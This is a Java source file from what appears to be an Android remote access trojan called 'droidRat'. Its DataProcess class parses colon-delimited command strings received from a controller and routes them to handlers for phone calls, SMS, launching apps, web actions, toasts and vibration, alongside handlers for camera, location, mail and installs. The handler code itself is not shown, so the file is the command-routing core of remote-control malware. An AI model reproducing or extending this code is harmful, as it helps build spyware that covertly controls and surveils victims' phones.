package com.je_chen.droidRat.module.process.receive.data.process_super;

import com.je_chen.droidRat.module.process.receive.data.process.*;

public class DataProcess {

    private DataFather dataFather;

    private final CallData callData;

    private final CameraData cameraData;

    private final InfoData infoData;

    private final InstallData installData;

    private final LocationData locationData;

    private final MailData mailData;

    private final PlayData playData;

    private final RunAppData runAppData;

    private final SensorData sensorData;

    private final SMSData smsData;

    private final ToastData toastData;

    private final VibratorData vibratorData;

    private final WebData webData;

    public DataProcess() {
        callData = new CallData();
        cameraData = new CameraData();
        infoData = new InfoData();
        installData = new InstallData();
        locationData = new LocationData();
        mailData = new MailData();
        playData = new PlayData();
        runAppData = new RunAppData();
        sensorData = new SensorData();
        smsData = new SMSData();
        toastData = new ToastData();
        vibratorData = new VibratorData();
        webData = new WebData();
    }

    public void processString(String dataString) {
        String[] dataArray = dataString.split(":");
        switch (dataArray[0]) {

            case "Call":
                dataFather = callData;
                dataFather.processData(dataArray);
                break;

            case "Info":
                dataFather = infoData;
                dataFather.processData(dataArray);
                break;

            case "RunApp":
                dataFather = runAppData;
                dataFather.processData(dataArray);
                break;

            case "SMS":
                dataFather = smsData;
                dataFather.processData(dataArray);
                break;

            case "Toast":
                dataFather = toastData;
                dataFather.processData(dataArray);
                break;

            case "Vibrator":
                dataFather = vibratorData;
                dataFather.processData(dataArray);
                break;

            case "Web":
                dataFather = webData;
                dataFather.processData(dataArray);
                break;

            default:
                System.out.println("Not Process String : " + dataString);
        }
    }
}
